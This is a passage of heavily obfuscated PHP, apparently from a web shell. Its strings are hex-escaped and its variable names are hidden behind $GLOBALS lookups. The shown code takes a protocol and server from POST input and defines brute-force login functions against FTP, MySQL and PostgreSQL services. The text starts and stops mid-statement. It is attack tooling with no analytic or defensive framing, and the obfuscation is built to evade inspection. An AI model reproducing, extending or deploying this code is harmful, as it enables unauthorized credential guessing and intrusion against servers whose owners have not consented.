73p\x61n\x3e\x54y\x70\x65:</spa\x6e\x3e\x20".htmlspecialchars($_POST["pro\x74o"])."\x20<s\x70\x61\x6e\x3eSe\x72ver:</sp\x61n\x3e ".htmlspecialchars($_POST["se\x72v\x65r"])."\x3c\x62\x72>";if($_POST["p\x72o\x74\x6f"]=="ftp"){function bruteForce($ip,$port,$login,$pass){${"GL\x4f\x42A\x4c\x53"}["at\x72\x62\x71j\x65\x65\x73"]="\x72e\x73";$xhndwtjr="\x70\x6frt";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x74m\x78ons\x78\x74k\x63"]}=@ftp_connect(${${"G\x4cO\x42\x41L\x53"}["\x76\x65\x6e\x6awg\x66\x6c"]},${$xhndwtjr}?${${"G\x4c\x4fB\x41\x4c\x53"}["\x6bk\x65\x6f\x71\x6aeb\x6fw\x6b"]}:21);$fmtknwcvh="r\x65s";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x76d\x6a\x64\x6ct\x7a\x76a"]="\x66p";if(!${${"\x47\x4c\x4fB\x41L\x53"}["tm\x78\x6f\x6e\x73\x78t\x6b\x63"]})return false;${$fmtknwcvh}=@ftp_login(${${"GLO\x42\x41L\x53"}["v\x64\x6a\x64ltz\x76\x61"]},${${"\x47L\x4fBAL\x53"}["\x63\x6b\x6c\x67\x73oie"]},${${"\x47L\x4fB\x41\x4c\x53"}["ex\x6e\x77v\x72"]});@ftp_close(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x74\x6d\x78\x6fnsx\x74\x6b\x63"]});return${${"\x47L\x4f\x42\x41L\x53"}["a\x74\x72b\x71j\x65\x65\x73"]};}}elseif($_POST["pr\x6ft\x6f"]=="\x6d\x79s\x71l"){function bruteForce($ip,$port,$login,$pass){${${"G\x4c\x4f\x42AL\x53"}["\x6a\x66\x62\x71\x74uah\x72"]}=@mysql_connect(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x76\x65\x6ej\x77\x67f\x6c"]}.":".${${"G\x4cOBA\x4c\x53"}["k\x6b\x65o\x71\x6a\x65b\x6f\x77\x6b"]}?${${"\x47\x4c\x4fB\x41\x4cS"}["kk\x65\x6fqj\x65b\x6f\x77\x6b"]}:3306,${${"\x47L\x4f\x42A\x4cS"}["\x63\x6b\x6c\x67\x73\x6f\x69e"]},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["ex\x6e\x77\x76\x72"]});$czdvbnm="r\x65\x73";@mysql_close(${$czdvbnm});return${${"G\x4cO\x42\x41\x4c\x53"}["\x6a\x66\x62q\x74ua\x68r"]};}}elseif($_POST["prot\x6f"]=="\x70gs\x71l"){function bruteForce($ip,$port,$login,$pass){$ughgyih="\x73\x74\x72";$bsojdh="\x73\x65r\x76e\x72";${"G\x4c\x4f\x42\x41\x4cS"}["\x64\x63ntn\x70\x64\x6a"]="\x72\x65s";${"\x47\x4cO\x42ALS"}["\x6a\x6a\x76\x71e\x6c\x64"]="\x6co\x67in";${"G\x4cO\x42\x41LS"}["\x70\x64\x7a\x75